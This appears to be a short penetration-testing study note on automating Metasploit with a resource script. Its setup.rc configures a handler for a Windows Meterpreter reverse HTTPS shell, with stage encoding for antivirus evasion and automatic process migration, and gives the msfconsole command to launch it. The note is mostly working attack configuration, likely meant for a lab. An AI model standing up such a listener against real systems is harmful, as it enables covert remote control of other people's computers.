We can take advantage of *Resource Scripts* to autmoate repetitive commands inside the framework. 

Create a script in our home directory. Ex: setup.rc
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

Run via msfconsole from kali:
`sudo msfconsole -r setup.rc`